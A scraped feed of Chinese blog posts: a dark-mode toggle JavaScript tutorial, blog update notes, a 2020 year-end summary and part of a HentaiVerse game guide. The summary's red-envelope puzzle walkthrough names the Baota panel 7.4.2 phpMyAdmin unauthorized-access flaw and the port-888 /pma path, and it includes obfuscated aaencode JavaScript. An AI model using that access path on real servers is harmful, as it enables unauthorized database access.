属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 